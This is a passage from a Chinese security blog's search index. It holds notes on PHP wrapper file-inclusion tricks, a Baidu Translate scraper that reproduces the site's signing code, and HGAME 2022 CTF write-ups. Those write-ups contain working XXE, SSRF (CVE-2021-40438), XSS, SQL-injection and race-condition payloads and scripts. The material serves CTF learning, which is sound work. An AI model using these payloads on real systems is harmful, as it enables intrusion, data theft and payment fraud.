压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n\n详细解读php:&#x2F;&#x2F;filter（读文件）php:&#x2F;&#x2F;filter用于读取源码\n?page=php://filter/read=convert.base64-encode/resource=/flag.php\n\nfile:&#x2F;&#x2F;协议  (读文件)用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响\n即file:&#x2F;&#x2F; [文件的绝对路径和文件名]\n?path=file:///var/www/html/flag.txt\n\nphp:&#x2F;&#x2F;input (获取POST请求)php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行\nphp:&#x2F;&#x2F;input 可以用来生成一句话木马\n利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：\ndata:&#x2F;&#x2F;协议 (写入)自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输\n?page=data://text/plain,&lt;?php%20phpinfo();?>\n\n如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：\n?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nzip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名\n如果网站允许我们上传压缩文件，我们也可以将php文件压缩后进行上传，再通过zip:&#x2F;&#x2F;协议执行。\n","categories":["web安全基础"],"tags":["php","php伪协议"]},{"title":"记对百度翻译的一次爬虫练习","url":"/2022/02/23/baidufanyi-project/","content":"最近简单学习了一下 requests 这个模块，一直没有亲自实战一下，然后就有了这次的实战练习\n浏览器F12对百度翻译进行抓包\n随便输入一个词句抓包\n我们主要要获取这里的数据\n\n而这里的数据是对https://fanyi.baidu.com/v2transapi?from=zh&amp;to=en这个链接发起的一次post请求\n可以看到请求表单中发送的关键数据\n\n尝试其他词句发现主要变化的是sign，还有token这两个关键变量\n在当前页面审查元素就能发现这个token\n\n现在关键是这个sign\n查看一下这个post方法的请求栈\n\n主要是index和public这两个js文件，打开搜索一下payload中的sign，发现在index这个js文件里有这个payload\n\n可以发现这里和post表单中的数据格式一样\n\n现在看看这个sign它是怎么生成的\n在sign: L(e)这里打一个断点调试一下\n刷新页面，来到这个sign处，然后点击单步调试\n\n然后跳转到了e(r)这个函数，这个应该就是生成sign的函数\n\n同时发现传递的参数正好是你输入的词句\n那么继续单步调试，到函数的末尾发现又调用了一个n(r, o)函数\n\n继续运行，结束\n经过上面的调试发现，这个sign就是使用了上面两个函数对输入的词句进行加密操作，具体的算法比较复杂，不需要搞懂它，我们可以使用python中的execujs这个库来运行，这个js代码，得到加密后的sign\n先不要急，在浏览器跑一下这个加密代码\ncv到控制台，输入参数运行\n\n发现报错了，查看报错列表知道是 i 这个变量没有定义\n那么继续回到原来的调试\n找到这个变量 i ，打个断点\n\n运行，发现这个变量 i 的值为 320305.131321201\n\n改变输入的词句发现这个 i 始终是个定值，都是 320305.131321201 ，那么现在所有的问题基本上就解决了，\n剩下的就是写爬虫脚本，代码如下\n对应 sign 的js代码\ni = '320305.131321201';\n\nfunction n(r, o) &#123;\n    for (var t = 0; t &lt; o.length - 2; t += 3) &#123;\n      var a = o.charAt(t + 2);\n      a = a >= 'a' ? a.charCodeAt(0) - 87 : Number(a),\n      a = '+' === o.charAt(t + 1) ? r >>> a : r &lt;&lt; a,\n      r = '+' === o.charAt(t) ? r + a &amp; 4294967295 : r ^ a\n    &#125;\n    return r\n  &#125;\n  function e(r) &#123;\n    var o = r.match(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]/g);\n    if (null === o) &#123;\n      var t = r.length;\n      t > 30 &amp;&amp; (r = '' + r.substr(0, 10) + r.substr(Math.floor(t / 2) - 5, 10) + r.substr( - 10, 10))\n    &#125; else &#123;\n      for (var e = r.split(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]/), C = 0, h = e.length, f = [\n      ]; h > C; C++) '' !== e[C] &amp;&amp; f.push.apply(f, a(e[C].split(''))),\n      C !== h - 1 &amp;&amp; f.push(o[C]);\n      var g = f.length;\n      g > 30 &amp;&amp; (r = f.slice(0, 10).join('') + f.slice(Math.floor(g / 2) - 5, Math.floor(g / 2) + 5).join('') + f.slice( - 10).join(''))\n    &#125;\n    var u = void 0,\n    l = '' + String.fromCharCode(103) + String.fromCharCode(116) + String.fromCharCode(107);\n    u = null !== i ? i : (i = window[l] || '') || '';\n    for (var d = u.split('.'), m = Number(d[0]) || 0, s = Number(d[1]) || 0, S = [\n    ], c = 0, v = 0; v &lt; r.length; v++) &#123;\n      var A = r.charCodeAt(v);\n      128 > A ? S[c++] = A : (2048 > A ? S[c++] = A >> 6 | 192 : (55296 === (64512 &amp; A) &amp;&amp; v + 1 &lt; r.length &amp;&amp; 56320 === (64512 &amp; r.charCodeAt(v + 1)) ? (A = 65536 + ((1023 &amp; A) &lt;&lt; 10) + (1023 &amp; r.charCodeAt(++v)), S[c++] = A >> 18 | 240, S[c++] = A >> 12 &amp; 63 | 128) : S[c++] = A >> 12 | 224, S[c++] = A >> 6 &amp; 63 | 128), S[c++] = 63 &amp; A | 128)\n    &#125;\n    for (var p = m, F = '' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(97) + ('' + String.fromCharCode(94) + String.fromCharCode(43) + String.fromCharCode(54)), D = '' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(51) + ('' + String.fromCharCode(94) + String.fromCharCode(43) + String.fromCharCode(98)) + ('' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(102)), b = 0; b &lt; S.length; b++) p += S[b],\n    p = n(p, F);\n    return p = n(p, D),\n    p ^= s,\n    0 > p &amp;&amp; (p = (2147483647 &amp; p) + 2147483648),\n    p %= 1000000,\n    p.toString() + '.' + (p ^ m)\n  &#125;\n\n\n\npython脚本\nimport execjs\nimport requests\nimport re\nimport json\nmainUrl = 'https://fanyi.baidu.com'\ntrsUrl = 'https://fanyi.baidu.com/v2transapi'\n\nwith open('sign.js', 'r') as file:# sign.js从浏览器对应的文件中复制过来\n    jsCode = file.read()\n\nsession = requests.session()\nindexResp = session.get(mainUrl)\ntoken = re.findall(\"token: '(.*?)'\", indexResp.text)[0]\n\ndef translate(word):\n    data = &#123;\n        # 这里将from和to参数改为auto发现可以任意语言翻译为中文，中文翻译为英文，可自动切换\n        \"from\": \"auto\",\n        \"to\": \"auto\",\n        \"query\": word,\n        \"transtype\": \"realtime\",\n        \"simple_means_flag\": \"3\",\n        \"sign\": execjs.compile(jsCode).call('e', word),\n        \"token\": token,\n        \"domain\": \"common\"\n    &#125;\n    return session.post(trsUrl, data=data).text\nif __name__ == '__main__':\n    word = input('请输入要翻译的词句: ')\n    response = translate(word)\n    print(json.loads(response)['trans_result']['data'][0]['dst'])\n\n最后测试，中英文都没问题\n\n\n","categories":["爬虫"],"tags":["python","爬虫"]},{"title":"HGAME 2022 Week4 writeup by pankas","url":"/2022/02/17/week4-pankas/","content":"最后一周我又摆烂了。    (QAQ)\nwebComment查看下源码\n关键部分\nfunction parseXML($str) &#123;\n    $dom = new DOMDocument();\n    try &#123;\n        $dom->loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);\n    &#125; catch (Exception $e) &#123;\n        http_response_code(400);\n        echo json_encode(['error' => 'invalid xml data']);\n        die();\n    &#125;\n    $attrs = simplexml_import_dom($dom);\n    if (!isset($attrs->content)) &#123;\n        http_response_code(400);\n        echo json_encode(['error' => 'content is empty']);\n        die();\n    &#125;\n    if (waf($attrs->sender) || waf($attrs->content)) &#123;\n        http_response_code(403);\n        echo json_encode(['error' => 'Hacker!']);\n        die();\n    &#125;\n    if ($attrs->sender == 'admin' &amp;&amp; !preg_match('/admin/i', $str)) &#123;\n        $flag = 'hgame&#123;xxxxx&#125;';\n        $attrs->content = $flag;\n    &#125;\n    return $attrs;\n&#125;\n\n结合前端post的请求\n\n这里存在XXE漏洞\n那么要让post的字符串没有admin但是转化后的XML对象的&lt;sender&gt;要为admin\n这里waf过滤了很多伪协议，但data://伪协议没有过滤\n所以可以构造payload\n&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY payload SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,YWRtaW4&#x3D;&quot;&gt; \n]&gt;\n&lt;comment&gt;&lt;sender&gt;&amp;payload;&lt;&#x2F;sender&gt;&lt;content&gt;flag&lt;&#x2F;content&gt;&lt;&#x2F;comment&gt;\n\n其中YWRtaW4=为admin的base64编码，这样检测字符串时没有admin，但实例化xml对象后由于data伪协议&lt;sender&gt;变为了admin，拿到flag\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]},{"title":"HGAME 2022 Week3 writeup by pankas","url":"/2022/02/10/week3-pankas/","content":"week3过年摆了，基本根本没做，惭愧·········\nwebVidar shop demo条件竞争，开多线程刷钱，够了就可以买flag了\nimport requests\nimport threading\nimport json\npayUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/pay/create'\ncreateOrderUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/order/create'\nsellUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/order/remove'\nheaders = &#123;\n        'Host': '4766634820.vidar-shop.mjclouds.com',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',\n        'Accept': 'application/json, text/plain, */*',\n        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n        'Accept-Encoding': 'gzip, deflate',\n        'Content-Type': 'application/json',\n        'Authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQyMDYzODUsImlhdCI6MTY0NDExOTk4NSwidWlkIjozNTF9.c4d_p8TutNYanYK7KPIJwuLFR9tkAIvdLZFhqPT_0jE',\n        'Origin': 'http://4766634820.vidar-shop.mjclouds.com',\n        'Connection': 'keep-alive',\n        'Referer': 'http://4766634820.vidar-shop.mjclouds.com/'\n    &#125;\ncreateData = &#123;\n        \"amount\": 1,\n        \"pid\": 5,\n        \"status\": 1,\n        \"uid\": 351\n    &#125;\ndef pay():\n    response = requests.post(createOrderUrl, data=json.dumps(createData), headers=headers)\n    oid = json.loads(response.text)['id']\n    payData = &#123;\n        'amount': 20,\n        'oid': oid,\n        'uid': 351\n    &#125;\n    requests.post(payUrl, data=json.dumps(payData), headers=headers)\n    return oid\ndef sell(oid):\n    # print(oid)\n    sellData = &#123;\n        'id': oid\n    &#125;\n    r = requests.post(sellUrl, data=json.dumps(sellData), headers=headers)\n    print(r.text)\ndef solve():\n    oid = pay()\n    for j in range(50):\n        threading.Thread(target=sell(oid)).start()\nif __name__ == '__main__':\n    for i in range(20):\n        threading.Thread(target=solve()).start()\n\n\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]},{"title":"HGAME 2022 Week2 writeup by pankas","url":"/2022/02/03/week2-pankas/","content":"webApache!打开题目F12查看源码发现hint\n\n下载附件得到Apache的配置文件\n在default.conf文件下发现flag在**&#x2F;falg**，并且500这个页面也有提示要在内网才能访问到根目录的flag\n结合hint可以知道要用到Apache的CVE-2021-40438这个漏洞，本质就是SSRF\n参考文章：\nCVE-2021-40438 poc|Apache SSRF漏洞poc - 🔰雨苁ℒ🔰 (ddosi.org)\n则可以构造payload\nGET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1\nHost: httpd.summ3r.top:60010\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.96822747.1642680058; __gads=ID=4b3dca87d022d0d1-228a4a0003d00030:T=1642683351:RT=1642683351:S=ALNI_MaeO4O3BpsWq8DZeC3LDGGcOfbqYA\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Tue, 25 Jan 2022 08:39:02 GMT\nIf-None-Match: \"22a-5d664045f9580\"\n\n拿到flag\n\nwebpack-engine很简单的一道题，用chrome浏览器打开得到一串明显是用base64加密的字符串\n\n进行两次base64 解码拿到flag\n\nAt0m的留言板一道XSS题\n发现在head标签中存在flag\n\n关注公众号发送消息发现是可以在该页面显示\n测试发现**&lt;img&gt;**标签未被过滤，那么可以构造payload\n&lt;img src=\"\" onerror=\"function inject()&#123;document.querySelector('.content').textContent=\ndocument.querySelector('head').textContent;&#125; inject();\">\n\n用微信发送从而得到flag（手慢痛失红包QAQ）\n\nPokemon打开F12发现hint\n\nid为1，2，3时都是pokemon，其他情况是404\n\n发现该页面从在SQL注入\n其过滤了'select'，'from'，'where'，'='，' '，'/**/'，'and'，'or'\n可以使用双写的方法绕过\n空格和&#x2F;**&#x2F;可以用&#x2F;*h*&#x2F;绕过\n\n# 使用\n\n1&#x2F;*h*&#x2F;OorRDER&#x2F;*h*&#x2F;BY&#x2F;*h*&#x2F;2;#\n\n# 发现其是两个字段，其他数字报错\n# 查询一下数据库\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SELselectECT&#x2F;*h*&#x2F;1,database();#\n\n# 发现有pokemon这个数据库\n# 再看一下这个pokemon这个数据库里的表名\nps:注意information这个单词里含有过滤的关键字 or\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SEselectLECT&#x2F;*h*&#x2F;1,group_concat(table_name)&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;infoORrmation_schema.tables&#x2F;*h*&#x2F;WHEwhereRE&#x2F;*h*&#x2F;table_schema&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;pokemon&#39;;#\n\n# 发现fllllllllaaaaaag这个表\n# 